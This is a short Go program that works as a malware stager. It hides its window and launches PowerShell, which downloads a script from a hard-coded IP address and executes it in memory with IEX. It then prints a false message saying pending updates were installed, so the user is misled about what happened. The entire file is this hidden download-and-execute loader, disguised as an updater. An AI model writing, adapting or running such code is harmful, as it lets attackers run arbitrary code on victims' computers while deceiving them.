package main

import (
	"fmt"
	"os/exec"
	"syscall"
)

func main() {

	cmd := exec.Command("PowerShell", "-Command", "IEX ((new-object net.webclient).downloadstring('http://192.168.100.3/update.ps1'))")
	//cmd := exec.Command("powershell.exe", "-c", "IEX ((new-object net.webclient).downloadstring('http://192.168.100.3/update.ps1'))")
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	//cmd.Stdout = os.Stdout
	//cmd.Stderr = os.Stderr
	//cmd.Stdin = os.Stdin
	err := cmd.Start()
	if err != nil {
		fmt.Printf("something went wrong %s", err)
		return
	}
	fmt.Println("Successfully installed pending updates !")
	//cmd.Wait()

}
